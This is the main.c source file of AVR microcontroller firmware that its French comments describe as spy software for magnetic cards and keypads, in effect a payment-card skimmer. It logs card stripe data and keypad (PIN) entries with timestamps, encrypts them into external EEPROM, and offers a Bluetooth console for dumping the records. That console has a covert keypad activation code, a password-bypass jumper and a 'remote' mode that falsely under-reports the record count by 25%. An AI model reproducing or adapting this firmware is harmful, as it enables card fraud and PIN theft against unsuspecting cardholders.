/*************************************************************************************************************
*    Titre	      : Logiciel d'espion pour carte magnétique sur ATMEGA32
*    Fichier      : main.c
*    SW Version   : 
*	 HW Version   : 3.1
*    Date début   : 9/07/2010
*    Mise à jours : 
**************************************************************************************************************/

/**************************************************************************************************************
 ** @file main.c
 ** @brief	Logiciel d'espion pour carte magnétique et clavier.
 **************************************************************************************************************/

#include <avr/io.h>
#include <avr/interrupt.h>
#include <stdio.h>

#include "aes.h"
#include "main.h"
#include "usart.h"
#include "twi.h"
#include "i2ceeprom.h"
#include "eeprom.h"
#include "magtek.h"
#include "kb.h"
#include "rtc_ds1337.h"
#include "smalltools.h"
#include "eepvars.h"

/*************************************************************************************************************
 	Fonction :		main  
 	Description :	Fonction pricipale de la console.  
 	Paramètres: 	aucun
 	Valeur retour:	aucun
**************************************************************************************************************/
/** @brief	Fonction pricipale de la console.
**************************************************************************************************************/
int main(void) 
{
	char password[26];
	char remotepass[26];
	char entpassword[26];
	char console[26];
	char commande[26];
	char temp[5];
	char mode;
	char memtest[1];
	char end;

    /** Initialisation du USART à 9600 bauds */
    USART_init(9600UL);

	/** Initialisation du TWI à 100Khz */
    Init_TWI(100000UL);

	/** Initialisation du ASIC de lecture de carte magnétique */
	init_MAGTEK();

	/** Initialisation du clavier */
	KB_Init();
	kbdebug=0;
	kb_scan_slacker=0;

	/** Initialisation du RTC */
	RTC_init();

	/** Initialisation de la variable de delai */
	delai=0;

	/** Initialisation sur front descendant de INT0 (timer sur RTC) */
	DDRD &= ~((1<<2));
	PORTD |= ((1<<2));
	MCUCR |= ((1<<ISC01));
	GICR |= ((1<<INT0));
   	
	sei();

	/* Clef d'activation du bluetooth (en eeprom) */
	EEPROM_read((int)&EEPVars.E_enkey[0],3,enkey);

	/* Mapping du clavier (en eeprom) */
	EEPROM_read((int)&EEPVars.E_key[0],16,keymap);

	/* Lecrture si vrai ou faux END (en eeprom) */
	EEPROM_read((int)&EEPVars.E_end,1,&end);

	/** Initialisation de l'entrée pour le jumper de mot de passe */
	DDRB &= ~((1<<4));
	PORTB |= ((1<<4));

	/** Initialisation de la sortie pour le contrôle du bluetooth */
	DDRC |= ((1<<5));
	PORTC &= ~((1<<5));


	/** Lecture du statut du eeprom */
	EEPROM_read((int)&EEPVars.E_memtest,1,memtest);

	// Si l'eeprom a été programmé pour la première fois
	if(memtest[0]=='!')
	{
		// Variable drapeau qui dit que le module est correctement initialisé
		EEPROM_write((int)&EEPVars.E_memtest,1,"$");

		// Pointeur mémoire vide 
		write_eeptr(0);

		memtest[0]=0xFF;
		I2CEEPROM_write(0,1,memtest);

		// Le bluetooth est neuf, on doit le programmer
		printf("+++\n\r");
		printf("ATSW24,0,0,0,0\n\r");
		printf("ATSW20,472,0,0,1\n\r");
		printf("ATSN,console\n\r");
		printf("ATSPF,15,+\n\r");
		printf("ATSW25,0,0,0,0\n\r");
		printf("ATSW27,300\n\r");
		printf("ATSW24,2,0,0,0\n\r");
		printf("ATURST\n\r");

		wait(12288);// Attendre 3 secondes
	}

	// Initialisation du USART à 115200 bauds
    USART_init(115200UL);

	// Lecture du statut du eeprom
	EEPROM_read((int)&EEPVars.E_memtest,1,memtest);

	// S'il n'y a encore rien de valide, erreur!
	if(memtest[0]!='$')
	{
		for(;;)
		{
			printf("ERROR, EEPROM MISSING!\n\r");
		}	
	}
	
	/** Effacer l'écran en ANSI */
	printf("\e[2J");

	/** Initialise la console en mode déconnecté */
	mode=LOGOFF;

	/** Désactivation bluetooth */
	PORTC |= ((1<<5));
//	PORTC &= ~((1<<5));

	/** Boucle principale */
	for(;;)
	{
		if(mode==LOGOFF)
		{
			if(!(PINB&0x10)) /* Jumper mot de passe actif */
			{
				/* Activation bluetooth */
				PORTC &= ~((1<<5));
				
				printf("BYPASS!\n\r");
				mode=LOGON;
			}
			else
			{
				printf("password:");
				EEPROM_read((int)&EEPVars.E_passl2[0],25,password);/** Lecture du mot de passe en mémoire EEPROM */
				EEPROM_read((int)&EEPVars.E_passl1[0],25,remotepass);
				EEPROM_read((int)&EEPVars.E_conname[0],8,console);
				EEPROM_read((int)&EEPVars.E_crypt[0],CRYPTO_KEY_SIZE+1,crypto_key);
				USART_getstring(STAR_ECHO, 25, entpassword);
				if(!stringcomp(entpassword,password))
				{
					printf(" OK\n\r");
					mode=LOGON;
				}
				else if(!stringcomp(entpassword,remotepass))
				{
					printf(" REMOTE OK\n\r");
					mode=LOGON_REMOTE;
				}
				else if(!stringcomp(entpassword,"test"))
				{
					printf(" TEST OK\n\r");
					mode=LOGON_TEST;
				}
				else
				{
					printf(" X\n\r");
				}
			}
		}
		if(mode>LOGOFF)
		{
			printf("%s>",console);
			USART_getstring(ECHO, 25, commande);
			printf("\n\r");

			if(mode==LOGON)
			{
				if(!stringcomp(commande,"v"))	// Version (voir la version du mircologiciel)
				{
					char version[32];

					EEPROM_read((int)&EEPVars.E_version,32,version);

					printf("%s\n\r",version);
				}
				else if(!stringcomp(commande,"?") || !stringcomp(commande,"h"))	// Help (aide)
				{
					printf("Version\n\r");
					printf("Help\n\r");
					printf("Set Clock\n\r");
					printf("show Clock\n\r");
					printf("PASSWORD\n\r");
					printf("CRYPTO\n\r");
					printf("change console Name\n\r");
					printf("Dump\n\r");
					printf("Format\n\r");
					printf("Wipe mem\n\r");
					printf("Logoff\n\r");
					printf("Exit\n\r");
				}
				else if(!stringcomp(commande,"sc"))	// SetClock (ajuster l'heure)
				{
					RTC_get_time();
			
					printf("Year>");
					USART_getstring(ECHO, 5, temp);
					if(*temp!=0)
						heure_actuelle.annee=strtoi(temp);
					printf("\n\r");
					printf("Month>");
					USART_getstring(ECHO, 3, temp);
					if(*temp!=0)
					heure_actuelle.mois=(unsigned char)strtoi(temp);
					printf("\n\r");
					printf("Day>");
					USART_getstring(ECHO, 3, temp);
					if(*temp!=0)
						heure_actuelle.jour=(unsigned char)strtoi(temp);
					printf("\n\r");
					printf("Hour>");
					USART_getstring(ECHO, 3, temp);
					if(*temp!=0)
						heure_actuelle.heure=(unsigned char)strtoi(temp);
					printf("\n\r");
					printf("Minutes>");
					USART_getstring(ECHO, 3, temp);
					if(*temp!=0)
						heure_actuelle.minute=(unsigned char)strtoi(temp);		
					printf("\n\r");			
					printf("Seconds>");	
					USART_getstring(ECHO, 3, temp);
					if(*temp!=0)
						heure_actuelle.seconde=(unsigned char)strtoi(temp);
					printf("\n\r");
					printf("OK\n\r");				
						RTC_set_time();

				}
				else if(!stringcomp(commande,"c"))	// ShowClock (voir l'heure)
				{
					RTC_get_time();

					printf("%02i/%02i/%02i %02i:%02i:%02i ",(unsigned char)(heure_actuelle.annee-2000),heure_actuelle.mois,heure_actuelle.jour,heure_actuelle.heure,heure_actuelle.minute,heure_actuelle.seconde);

					if(heure_actuelle.batt_low)
					{
						printf("BAT FAIL\n\r");
					}
					else
					{
						printf("BAT OK\n\r");
					}
				}
				else if(!stringcomp(commande,"password"))	// Change Password (changer mot de passe)
				{
					printf("password:");
					EEPROM_read((int)&EEPVars.E_passl2,25,password);
					USART_getstring(STAR_ECHO, 25, entpassword);
					if(!stringcomp(entpassword,password))
					{
						printf("\n\rnew:");
						USART_getstring(STAR_ECHO, 25, entpassword);
						printf("\n\ragain:");
						USART_getstring(STAR_ECHO, 25, password);
						if(!stringcomp(entpassword,password))
						{
							EEPROM_write((int)&EEPVars.E_passl2,25,password);
							printf("\n\rOK\n\r");	
						}
						else
						{
							printf("\n\rERR\n\r");
						}
					}
					else
					{
						printf(" X\n\r");
					}
	
				}
				else if(!stringcomp(commande,"crypto"))	// Crypto Key (changer la clef de cryptage)
				{
					int i;

					/** Préparer la mémoire pour la clef */
					for(i=0;i<33;i++)
					{		
						crypto_key[i]=0x00;
					}

   					printf("New crypto key>");
   					USART_getstring(ECHO,CRYPTO_KEY_SIZE, (char *)crypto_key);
					EEPROM_write((int)&EEPVars.E_crypt, CRYPTO_KEY_SIZE+1, (char *)crypto_key);
						printf("\n\rFORMATTING...");
						/* Définitivement pas d'écriture pendant le formattage!! */
					GICR &= ~((1<<INT0));
						temp[0]=0xff;
					I2CEEPROM_write(0, 1, temp);
					write_eeptr(0);
						/* On rétablit l'interruption pour l'écriture */
					GICR |= ((1<<INT0));
						printf("OK\n\r");
				}
				else if(!stringcomp(commande,"n"))	// change console name (changer le nom de la console)
				{
   					printf("New console name>");
   					USART_getstring(ECHO,25, console);
					EEPROM_write((int)&EEPVars.E_conname, 8, console);
						printf(" OK\n\r");
				}
				else if(!stringcomp(commande,"!eeptr!"))	// debug eeptr
				{
					unsigned long eeptr;

					read_eeptr(&eeptr);

					printf("EEptr = 0x%04x\n\r",(unsigned int)eeptr);
				}
				else if(!stringcomp(commande,"!kbd!"))	// debug le kb
				{
					printf("KB Debug Mode\n\r");
					kbdebug=1;
					getchar();
					kbdebug=0;
				}
				else if(!stringcomp(commande,"!wkb!"))	// ecris une fausse string kb
				{
					KB_char_cnt=5;
					stringcpy((char *)KB_buf,"1234A",5);
					write_kb_i2ceeprom();

				}
				else if(!stringcomp(commande,"d"))	// Dump (voir le log)
				{
					unsigned long adr=0;
					unsigned char rec[51];
					unsigned int count=1;
					unsigned int crc, crcv;
					
					rec[0]=0;
						/* Pas d'écriture pendant le dump!! */
					GICR &= ~((1<<INT0));
						while(adr<I2CEEPROM_TOP && rec[0]!=0xFF)
					{
						I2CEEPROM_read(adr,1,(char *)rec);
						if(rec[0]!=0xFF)
						{
							I2CEEPROM_read(adr,rec[0],(char *)rec);
								/*decrypt*/
							rijndael('d', (unsigned char *)&rec[1], (unsigned char *)&crypto_key[0]);
							rijndael('d', (unsigned char *)&rec[17], (unsigned char *)&crypto_key[16]);
							if(rec[8]==0x00)//Si c'est un mag record, décrypter la balance de la string
							{
								rijndael('d', (unsigned char *)&rec[33], (unsigned char *)&crypto_key[0]);
							}	
								crc=crcccitt(0, (char *)&rec[1], rec[1]-2);	/* Calcul du CRC 16 (CCITT) de la chaine */
								crcv=(unsigned int)(rec[(rec[1]-1)])+(((unsigned int)(rec[rec[1]]))<<8);
								rec[rec[1]-1]=0x00; /* Mettre un null à la place du CRC */
							printf("%i)%02i/%02i/%02i %02i:%02i:%02i %02i %s ",count,rec[2],rec[3],rec[4],rec[5],rec[6],rec[7],rec[8],&rec[9]);
								if(crc!=crcv)
								printf("BAD CRC! (%04x vs %04x)\n\r",crc,crcv); /* Si le CRC16 n'est pas bon, l'afficher */
							else
							printf("\n\r");

							adr+=((unsigned long)rec[0]);	/* Prochaine chaine à adresse actuelle + long. chaine */
							count++;
						}
					}
						/* On rétablit l'interruption pour l'écriture */
					GICR |= ((1<<INT0));
				}	
				else if(!stringcomp(commande,"w"))	// Wipe (vider le log complètement)
				{
					printf("WIPING MEM...");
					
					/* Définitivement pas d'écriture pendant le formattage!! */
					GICR &= ~((1<<INT0));
						format_mem();
					write_eeptr(0);
						/* On rétablit l'interruption pour l'écriture */
					GICR |= ((1<<INT0));	
						printf("OK\n\r");
				}
				else if(!stringcomp(commande,"f"))	// Format (Réinitialiser le log)
				{
					printf("FORMATTING...");
				
					/* Définitivement pas d'écriture pendant le formattage!! */
					GICR &= ~((1<<INT0));
						temp[0]=0xff;
					I2CEEPROM_write(0, 1, temp);
					write_eeptr(0);
						/* On rétablit l'interruption pour l'écriture */
					GICR |= ((1<<INT0));	
						printf("OK\n\r");
				}
				else if(!stringcomp(commande,"l"))	// Logoff (sortir du mode console)
				{
					mode=LOGOFF;
				}
				else if(!stringcomp(commande,"e"))	// Exit (sortir du mode console en éteignant le bluetooth)
				{
					mode=LOGOFF;
					/** Désactivation bluetooth */
					PORTC |= ((1<<5));	
				}
				else if(!stringcomp(commande,""))	// ne rien faire avec un enter
				{
				}
				else
					printf("ERR\n\r");
			}
			else if(mode==LOGON_TEST) /**********************************************************/
			{
				if(!stringcomp(commande,"t"))	// Dump test (Voir 2 lignes du log encrypté )
				{
					unsigned long adr=0;
					unsigned char rec[50];
					unsigned int count=0;
					unsigned int i;
					
					rec[0]=0;

					printf("BEGIN>>>");
					/* Pas d'écriture pendant le dump!! */
					GICR &= ~((1<<INT0));

					while(adr<I2CEEPROM_TOP && rec[0]!=0xFF && count<2)
					{
						I2CEEPROM_read(adr,1,(char *)rec);
						if(rec[0]!=0xFF)
						{
							I2CEEPROM_read(adr,rec[0],(char *)rec);

							/* Affichage des bytes en hexadécimal */
							for(i=1;i<(rec[0]);i++)
							{
								printf("%02x",rec[i]);
							}
								adr+=((unsigned long)rec[0]);	/* Prochaine chaine à adresse actuelle + nb cars */
							count++;
						}
					}
						printf("<<<ENDTEST\n\r");
						/* On rétablit l'interruption pour l'écriture */
					GICR |= ((1<<INT0));
				}
				else if(!stringcomp(commande,"l"))	// Logoff (sortir du mode test)
				{
					mode=LOGOFF;
				}
				else if(!stringcomp(commande,"e"))	// Exit (sortir du mode test en éteignant le bluetooth)
				{
					mode=LOGOFF;
					/** Désactivation bluetooth */
					PORTC |= ((1<<5));	
				}
				else if(!stringcomp(commande,""))	// ne rien faire avec un enter
				{
				}
				else
					printf("ERR\n\r");
			}
			else if(mode==LOGON_REMOTE) /**********************************************************/
			{
				if(!stringcomp(commande,"v"))	// Version (voir la version du mircologiciel)
				{
					char version[32];

					EEPROM_read((int)&EEPVars.E_version,32,version);

					printf("%s\n\r",version);
				}
				else if(!stringcomp(commande,"d"))	// Dump (Voir le log encrypté )
				{
					unsigned long adr=0;
					unsigned char rec[132];
					unsigned int count=0;
					unsigned int i;
					
					rec[0]=0;
					printf("BEGIN>>>");
					/* Pas d'écriture pendant le dump!! */
					GICR &= ~((1<<INT0));
					while(adr<I2CEEPROM_TOP && rec[0]!=0xFF)
					{
						I2CEEPROM_read(adr,1,(char *)rec);
						if(rec[0]!=0xFF)
						{
							I2CEEPROM_read(adr,rec[0],(char *)rec);

							/* Affichage des bytes en hexadécimal */
							for(i=1;i<(rec[0]);i++)
							{
								printf("%02x",rec[i]);
							}
								adr+=((unsigned long)rec[0]);	/* Prochaine chaine à adresse actuelle + nb cars */
							count++;
						}
					}
					/* Fin de la lecture et donne le nombre d'enregistrements */
					if(end=='1')
						printf("<<<END%i\n\r",(count*3)/4); // Faux END (75%)
					else
						printf("<<<END%i\n\r",count);

					/* On rétablit l'interruption pour l'écriture */
					GICR |= ((1<<INT0));
				}
				else if(!stringcomp(commande,"f"))	// Format (Réinitialisé la mémoire I2CEEPROM)
				{
					/* Définitivement pas d'écriture pendant le formattage!! */
					GICR &= ~((1<<INT0));

					temp[0]=0xff;
					I2CEEPROM_write(0, 1, temp);
					write_eeptr(0);
				
					/* On rétablit l'interruption pour l'écriture */
					GICR |= ((1<<INT0));	

					printf("OK\n\r");
				}
				else if(!stringcomp(commande,"s"))	// SetClock (ajuster l'heure)
				{
					RTC_get_time();
				
					printf("Year>");
					USART_getstring(ECHO, 5, temp);
					if(*temp!=0)
						heure_actuelle.annee=strtoi(temp);
					printf("\n\r");
					printf("Month>");
					USART_getstring(ECHO, 3, temp);
					if(*temp!=0)
					heure_actuelle.mois=(unsigned char)strtoi(temp);
					printf("\n\r");
					printf("Day>");
					USART_getstring(ECHO, 3, temp);
					if(*temp!=0)
						heure_actuelle.jour=(unsigned char)strtoi(temp);
					printf("\n\r");
					printf("Hour>");
					USART_getstring(ECHO, 3, temp);
					if(*temp!=0)
						heure_actuelle.heure=(unsigned char)strtoi(temp);
					printf("\n\r");
					printf("Minutes>");
					USART_getstring(ECHO, 3, temp);
					if(*temp!=0)
						heure_actuelle.minute=(unsigned char)strtoi(temp);		
					printf("\n\r");			
					printf("Seconds>");	
					USART_getstring(ECHO, 3, temp);
					if(*temp!=0)
						heure_actuelle.seconde=(unsigned char)strtoi(temp);
					printf("\n\r");
					printf("OK\n\r");				
						RTC_set_time();

				}
				else if(!stringcomp(commande,"c"))	// ShowClock (voir l'heure)
				{
					RTC_get_time();

					printf("%02i/%02i/%02i %02i:%02i:%02i ",(unsigned char)(heure_actuelle.annee-2000),heure_actuelle.mois,heure_actuelle.jour,heure_actuelle.heure,heure_actuelle.minute,heure_actuelle.seconde);

					if(heure_actuelle.batt_low)
					{
						printf("BAT FAIL\n\r");
					}
					else
					{
						printf("BAT OK\n\r");
					}
				}
				else if(!stringcomp(commande,"password"))
				{
					printf("password:");
					EEPROM_read((int)&EEPVars.E_passl1,25,remotepass);
					USART_getstring(STAR_ECHO, 25, entpassword);
					if(!stringcomp(entpassword,remotepass))
					{
						printf("\n\rnew:");
						USART_getstring(STAR_ECHO, 25, entpassword);
						printf("\n\ragain:");
						USART_getstring(STAR_ECHO, 25, remotepass);
						if(!stringcomp(entpassword,remotepass))
						{
							EEPROM_write((int)&EEPVars.E_passl1,25,remotepass);
							printf("\n\rOK\n\r");	
						}
						else
						{
							printf("\n\rERR\n\r");
						}
					}
					else
					{
						printf(" X\n\r");
					}
	
				}
				else if(!stringcomp(commande,"l"))	// Logoff (sortir du mode remote)
				{
					mode=LOGOFF;
				}
				else if(!stringcomp(commande,"e"))	// Exit (sortir du mode remote en éteignant le bluetooth)
				{
					mode=LOGOFF;

					/** Désactivation bluetooth */
					PORTC |= ((1<<5));	
					
				}
				else if(!stringcomp(commande,""))	// ne rien faire avec un enter
				{
				}
				else
					printf("ERR\n\r");
			}
		}
	}
}

/*************************************************************************************************************
 	Fonction :		SIG_INTERUPT0
 	Description :	Routine invoquée aux 1/4096 secondes (4KHz)
 	Paramètres: 	aucun
 	Valeur retour:	aucun
**************************************************************************************************************/
/** @brief	Routine invoquée aux 1/4096 secondes (4KHz)
**************************************************************************************************************/
SIGNAL(SIG_INTERRUPT0)
{
	if(delai) /* Décrémentation de la valeur delai */
	{
		delai--;
	}

    if(KB_timer) /* Décrémentation du timeout timer pour le clavier */
    {
        KB_timer--;
    }
	else if(KB_in_read)
	{
		if(KB_char_cnt>3)
		{
			write_kb_i2ceeprom();
		}

		KB_char_cnt=0;
		KB_in_read=FALSE;
	}

	if((kb_scan_slacker%KB_SLACKER)==0)
	{
		KB_int_proc(); /* Procédure de lecture du clavier 4x4 */

		if(KB_ready) /* Si nous avons une touche... */
		{
			if(kbdebug) // Si en mode de deboggage clavier
			{
				USART_putchar(KB_key, NULL);
				KB_ready=0; /* Redecente du flag de nouvelle touche */
			}
			else
			{
				/* Ajout de la clef dans la chaine */
				if(KB_char_cnt<(KB_CHARS-1))
				{
					KB_buf[KB_char_cnt]=KB_key;
					KB_char_cnt++;
					KB_timer=KB_TIMEOUT;
					KB_in_read=TRUE; /* Lecture active */
				}	

				/* Fonctions spéciales sur les touches */
				if(KB_char_cnt==2)
				{
					KB_buf[2]=0; /* Mettre une terminaison au bout de la chaine */		

					if(!stringcomp((char *)KB_buf,"0A")) /* Code de remise à zéro */
					{
	   		         	WDTCR = 0x18;
					}
            
					if(!stringcomp((char *)KB_buf,enkey)) /* Code d'activation du bluetooth */	/*************/
   		        	{

						/* Activation bluetooth */
						PORTC &= ~((1<<5));

						KB_in_read=FALSE;
						KB_char_cnt=0;
   	       			}
				}

				/* Si A ou K a été appuyé */		
				if(KB_key=='A' || KB_key=='K')
				{
					if(KB_char_cnt>3)
					{
						write_kb_i2ceeprom();
					}

					KB_char_cnt=0;
					KB_in_read=FALSE;
				}	

				KB_ready=0; /* Redecente du flag de nouvelle touche */
			}
		}
	}

	kb_scan_slacker++;

	if(MAGTEK_re==1) /* Si nous avons une lecture de magnétique */
	{
		write_mag_i2ceeprom();	
		MAGTEK_re=0;
	}
}

/*************************************************************************************************************
 	Fonction :		write_kb_i2ceeprom
 	Description :	Routine qui écrit la chaine de caractères clavier en I2CEEPROM
 	Paramètres: 	aucun
 	Valeur retour:	aucun
**************************************************************************************************************/
/** @brief	Routine qui écrit la chaine de caractères clavier en I2CEEPROM
**************************************************************************************************************/
void write_kb_i2ceeprom(void)
{
		unsigned long adr;
		unsigned int i;
		unsigned int crc;
		char rec[34];
		char retval;

		RTC_get_time();											/* Lecture de l'heure actuelle */

		rec[0]=33;												/* Prochaine chaine dans 33 cars. */
		rec[1]=32;												/* Nombre de bytes de la chaine */
		rec[2]=(unsigned char)((heure_actuelle.annee)-2000);	/* Année en byte */
		rec[3]=heure_actuelle.mois;								/* Mois en byte */
		rec[4]=heure_actuelle.jour;								/* Jour en byte */
		rec[5]=heure_actuelle.heure;							/* Heure en byte */
		rec[6]=heure_actuelle.minute;							/* Minute en byte */
		rec[7]=heure_actuelle.seconde;							/* Seconde en byte */

		rec[8]=0x01;											/* Type Clavier */

		for(i=0;i<KB_char_cnt && i<12;i++)	/* Copie du nombre de byte dans le tampon de clavier */
			rec[9+i]=KB_buf[i];

		i=i+9;						/* Ajout des 8 bytes pour l'entête + 1 byte pour le pointeur  */
	
		while(i<33)					/* Mettre des 0 comme "padding" */
		{
			rec[i]=0x00;
			i++;
		}

		crc=crcccitt(0, &rec[1], 30);	/* Calcul du CRC 16 (CCITT) de la chaine */

		rec[31]=(unsigned char)(crc & 0x00FF);
		rec[32]=(unsigned char)((crc & 0xFF00)>>8);

		rec[33]=0xFF;				/* Terminaison de la liste par 0xFF */

		/** Encryption de la chaine */
		rijndael('c', (unsigned char *)&rec[1], (unsigned char *)&crypto_key[0]);
		rijndael('c', (unsigned char *)&rec[17], (unsigned char *)&crypto_key[16]);

		read_eeptr(&adr);			/* Lecture de l'adresse de fin de liste */

		retval=I2CEEPROM_write(adr,34,rec);	/* Écriture de la chaine */

		if(retval!=0)
			write_eeptr(adr+33);			/* Ajuster le pointeur d'ajout de chaine dans la liste  */

}

/*************************************************************************************************************
 	Fonction :		write_mag_i2ceeprom
 	Description :	Routine qui écrit la chaine de caractères mag en I2CEEPROM
 	Paramètres: 	aucun
 	Valeur retour:	aucun
**************************************************************************************************************/
/** @brief	Routine qui écrit la chaine de caractères mag en I2CEEPROM
**************************************************************************************************************/
void write_mag_i2ceeprom(void)
{
		/* Écriture de la chaine */
		unsigned long adr;
		unsigned int i;
		unsigned int crc;
		char rec[50];
		char retval;

		RTC_get_time();											/* Lecture de l'heure actuelle */

		rec[0]=49;												/* Prochaine chaine dans 49 cars. */
		rec[1]=48;												/* Nombre de bytes de la chaine */
		rec[2]=(unsigned char)((heure_actuelle.annee)-2000);	/* Année en byte */
		rec[3]=heure_actuelle.mois;								/* Mois en byte */
		rec[4]=heure_actuelle.jour;								/* Jour en byte */
		rec[5]=heure_actuelle.heure;							/* Heure en byte */
		rec[6]=heure_actuelle.minute;							/* Minute en byte */
		rec[7]=heure_actuelle.seconde;							/* Seconde en byte */

		rec[8]=0x00;											/* Type Carte */

		i=0;

		do		/* Copie du nombre de byte dans le tampon de carte */
		{
			rec[9+i]=MAGTEK_str[i];
			i++;
		}
		while(MAGTEK_str[i]!=0x00 && i<38);

		i=i+9;						/* Ajout des 8 bytes pour l'entête + 1 byte pour le pointeur */
	
		while(i<49)					/* Mettre des 0 comme "padding" */
		{
			rec[i]=0x00;
			i++;
		}

		crc=crcccitt(0, &rec[1], 46);	/* Calcul du CRC 16 (CCITT) de la chaine */

		rec[47]=(unsigned char)(crc & 0x00FF);
		rec[48]=(unsigned char)((crc & 0xFF00)>>8);

		rec[49]=0xFF;				/* Terminaison de la liste par 0xFF */

		/** Encryption de la chaine */
		rijndael('c', (unsigned char *)&rec[1], (unsigned char *)&crypto_key[0]);
		rijndael('c', (unsigned char *)&rec[17], (unsigned char *)&crypto_key[16]);
		rijndael('c', (unsigned char *)&rec[33], (unsigned char *)&crypto_key[0]);

		read_eeptr(&adr);			/* Lecture de l'adresse de fin de liste */

		retval=I2CEEPROM_write(adr,50,rec);	/* Écriture de la chaine */
		
		if(retval!=0)
			write_eeptr(adr+49);			/* Ajuster le pointeur d'ajout de chaine dans la liste */
}
